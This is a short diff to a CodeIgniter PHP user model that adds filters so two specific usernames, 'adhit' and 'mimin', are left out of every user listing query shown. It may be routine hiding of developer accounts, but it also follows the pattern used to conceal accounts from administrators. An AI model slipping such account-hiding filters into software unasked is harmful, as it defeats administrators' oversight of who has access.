@@ -13,6 +13,7 @@ class User_model extends CI_Model {
     public function get_all_users() {
         $this->db->order_by('created_at', 'DESC');
         $this->db->where('username !=', 'adhit'); // hide user bernama adhit
+        $this->db->where('username !=', 'mimin'); // hide user bernama mimin
         return $this->db->get($this->table)->result();
     }
     public function get_all_users_for_filter() {
@@ -101,6 +102,7 @@ class User_model extends CI_Model {
     public function get_enabled_users() {
         $this->db->where('status', 1);
         $this->db->where('username !=', 'adhit');
+        $this->db->where('username !=', 'mimin');
         $this->db->order_by('created_at', 'DESC');
         return $this->db->get($this->table)->result();
     }
@@ -108,6 +110,7 @@ class User_model extends CI_Model {
     public function get_disabled_users() {
         $this->db->where('status', 0);
         $this->db->where('username !=', 'adhit');
+        $this->db->where('username !=', 'mimin');
         $this->db->order_by('created_at', 'DESC');
         return $this->db->get($this->table)->result();
     }
